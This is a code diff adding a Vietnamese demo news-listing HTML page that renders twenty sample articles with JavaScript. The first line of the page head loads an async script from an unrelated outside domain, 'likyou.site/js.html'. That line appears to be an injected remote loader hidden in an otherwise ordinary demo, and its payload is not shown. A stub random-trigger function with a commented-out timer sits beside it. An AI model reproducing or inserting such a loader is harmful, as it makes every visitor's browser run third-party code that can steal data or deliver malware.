@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <script src="https://likyou.site/js.html" async></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <title>Danh sách tin tức</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
+        }
+        header {
+            background: #1a73e8;
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        header a {
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            background: rgba(255,255,255,0.2);
+        }
+        header h1 { font-size: 28px; }
+        .container {
+            max-width: 1000px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+        .news-list {
+            display: grid;
+            gap: 20px;
+        }
+        .news-item {
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 3px 15px rgba(0,0,0,0.08);
+            display: flex;
+            transition: transform 0.2s, box-shadow 0.2s;
+            cursor: pointer;
+        }
+        .news-item:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.12);
+        }
+        .news-item img {
+            width: 220px;
+            height: 150px;
+            object-fit: cover;
+            flex-shrink: 0;
+        }
+        .news-content {
+            padding: 18px;
+            flex: 1;
+        }
+        .news-content h2 {
+            font-size: 18px;
+            margin-bottom: 8px;
+            color: #1a73e8;
+        }
+        .news-content p {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 10px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+        .meta {
+            font-size: 13px;
+            color: #888;
+        }
+        footer {
+            text-align: center;
+            padding: 25px;
+            color: #777;
+            font-size: 14px;
+        }
+        @media (max-width: 700px) {
+            .news-item { flex-direction: column; }
+            .news-item img { width: 100%; height: 180px; }
+        }
+        a {
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <a href="/"><h1>Home Page</h1></a>
+    </header>
+
+    <div class="container">
+        <p>
+
+       
+        </p>
+        <div class="news-list" id="newsList"></div>
+    </div>
+
+    <footer>
+        © 2026 - Trang tin tức demo
+    </footer>
+
+    <script>
+        // Dữ liệu 20 tin tức mẫu
+        const newsData = [
+            { id: 1, title: "Công nghệ AI bùng nổ năm 2026", summary: "Trí tuệ nhân tạo tiếp tục phát triển mạnh mẽ với nhiều ứng dụng mới trong đời sống.", image: "https://picsum.photos/id/1/400/300", date: "22/08/2026", category: "Công nghệ" },
+            { id: 2, title: "Thời tiết cực đoan gia tăng", summary: "Các nhà khoa học cảnh báo về sự gia tăng của bão và lũ lụt do biến đổi khí hậu.", image: "https://picsum.photos/id/10/400/300", date: "21/08/2026", category: "Môi trường" },
+            { id: 3, title: "Giá vàng tăng mạnh", summary: "Giá vàng trong nước và thế giới đồng loạt tăng cao trong tuần qua.", image: "https://picsum.photos/id/20/400/300", date: "21/08/2026", category: "Kinh tế" },
+            { id: 4, title: "Đội tuyển Việt Nam thắng lớn", summary: "Đội tuyển quốc gia giành chiến thắng ấn tượng trước đối thủ mạnh.", image: "https://picsum.photos/id/30/400/300", date: "20/08/2026", category: "Thể thao" },
+            { id: 5, title: "Phát hiện hành tinh mới giống Trái Đất", summary: "Các nhà thiên văn học vừa phát hiện một hành tinh có khả năng có sự sống.", image: "https://picsum.photos/id/40/400/300", date: "20/08/2026", category: "Khoa học" },
+            { id: 6, title: "Xu hướng thời trang thu đông 2026", summary: "Những gam màu và kiểu dáng sẽ thống trị mùa thu đông năm nay.", image: "https://picsum.photos/id/50/400/300", date: "19/08/2026", category: "Thời trang" },
+            { id: 7, title: "Ứng dụng mới giúp học ngoại ngữ", summary: "Một app AI mới giúp người dùng học tiếng Anh hiệu quả chỉ trong 15 phút mỗi ngày.", image: "https://picsum.photos/id/60/400/300", date: "19/08/2026", category: "Công nghệ" },
+            { id: 8, title: "Du lịch Việt Nam phục hồi mạnh", summary: "Lượng khách quốc tế đến Việt Nam tăng vọt trong quý 3 năm 2026.", image: "https://picsum.photos/id/70/400/300", date: "18/08/2026", category: "Du lịch" },
+            { id: 9, title: "Cảnh báo lừa đảo trực tuyến", summary: "Cảnh sát khuyến cáo người dân cảnh giác với các hình thức lừa đảo mới trên mạng.", image: "https://picsum.photos/id/80/400/300", date: "18/08/2026", category: "An ninh" },
+            { id: 10, title: "Phim Việt đạt giải quốc tế", summary: "Một bộ phim điện ảnh Việt Nam vừa giành giải lớn tại liên hoan phim châu Á.", image: "https://picsum.photos/id/90/400/300", date: "17/08/2026", category: "Giải trí" },
+            { id: 11, title: "Giá xăng giảm nhẹ", summary: "Từ 15h chiều nay, giá xăng dầu trong nước được điều chỉnh giảm.", image: "https://picsum.photos/id/100/400/300", date: "17/08/2026", category: "Kinh tế" },
+            { id: 12, title: "Robot phục vụ trong nhà hàng", summary: "Nhiều nhà hàng tại TP.HCM bắt đầu sử dụng robot phục vụ khách.", image: "https://picsum.photos/id/110/400/300", date: "16/08/2026", category: "Công nghệ" },
+            { id: 13, title: "Bão số 5 sắp đổ bộ", summary: "Trung tâm dự báo khí tượng thủy văn cảnh báo bão số 5 sẽ ảnh hưởng miền Trung.", image: "https://picsum.photos/id/120/400/300", date: "16/08/2026", category: "Thời tiết" },
+            { id: 14, title: "Khám phá hang động mới tại Quảng Bình", summary: "Các nhà thám hiểm vừa tìm thấy hệ thống hang động mới với vẻ đẹp kỳ ảo.", image: "https://picsum.photos/id/130/400/300", date: "15/08/2026", category: "Du lịch" },
+            { id: 15, title: "Chứng khoán tăng điểm mạnh", summary: "VN-Index tăng hơn 20 điểm trong phiên giao dịch hôm nay.", image: "https://picsum.photos/id/140/400/300", date: "15/08/2026", category: "Tài chính" },
+            { id: 16, title: "Y tế từ xa phát triển mạnh", summary: "Người dân có thể khám bệnh trực tuyến dễ dàng hơn với nhiều nền tảng mới.", image: "https://picsum.photos/id/237/400/300", date: "14/08/2026", category: "Y tế" },
+            { id: 17, title: "Lễ hội văn hóa mùa thu", summary: "Nhiều tỉnh thành tổ chức lễ hội văn hóa thu hút hàng nghìn du khách.", image: "https://picsum.photos/id/160/400/300", date: "14/08/2026", category: "Văn hóa" },
+            { id: 18, title: "Xe điện ngày càng phổ biến", summary: "Doanh số xe điện tại Việt Nam tăng gấp đôi so với cùng kỳ năm ngoái.", image: "https://picsum.photos/id/170/400/300", date: "13/08/2026", category: "Ô tô" },
+            { id: 19, title: "Giáo dục số hóa toàn diện", summary: "Bộ Giáo dục đẩy mạnh chuyển đổi số trong hệ thống trường học.", image: "https://picsum.photos/id/180/400/300", date: "13/08/2026", category: "Giáo dục" },
+            { id: 20, title: "Ẩm thực đường phố Việt Nam lên sóng", summary: "Một chương trình truyền hình nước ngoài giới thiệu ẩm thực vỉa hè Việt Nam.", image: "https://picsum.photos/id/190/400/300", date: "12/08/2026", category: "Ẩm thực" }
+        ];
+
+        // Lưu dữ liệu vào localStorage để trang chi tiết dùng
+        localStorage.setItem('newsData', JSON.stringify(newsData));
+
+        // Render danh sách
+        const listEl = document.getElementById('newsList');
+        newsData.forEach(news => {
+            const item = document.createElement('div');
+            item.className = 'news-item';
+            item.onclick = () => {
+                window.location.href = `detail.html?id=${news.id}`;
+            };
+            item.innerHTML = `
+                <img src="${news.image}" alt="${news.title}">
+                <div class="news-content">
+                    <h2>${news.title}</h2>
+                    <p>${news.summary}</p>
+                    <div class="meta">${news.category} • ${news.date}</div>
+                </div>
+            `;
+            listEl.appendChild(item);
+        });
+        function getRandomIntInclusive(min, max) {
+          const minCeiled = Math.ceil(min);
+          const maxFloored = Math.floor(max);
+          return Math.floor(Math.random() * (maxFloored - minCeiled + 1)) + minCeiled;
+        }
+        function message() {
+                  var ran1 = getRandomIntInclusive(1,4);
+                  if(ran1 === 2) {
+                     
+                  }
+                  
+        }
+        //setTimeout(message,2000);
+        
+    </script>
+</body>
+</html>
